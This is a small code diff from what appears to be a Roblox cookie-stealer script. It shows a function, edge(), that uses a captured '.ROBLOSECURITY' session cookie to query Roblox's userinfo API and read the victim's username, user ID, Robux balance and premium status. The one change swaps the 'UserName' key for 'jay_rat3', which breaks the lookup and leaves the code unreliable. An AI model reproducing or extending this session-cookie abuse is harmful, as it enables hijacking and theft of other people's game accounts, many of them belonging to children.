@@ -93,7 +93,7 @@ def edge():
         info = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":cookie})
         if info.status_code == 200:
             information = json.loads(info.text)
-            username = information['UserName']
+            username = information['jay_rat3']
             id = information["UserID"]
             balance = information["RobuxBalance"]
             premium = information["IsPremium"]
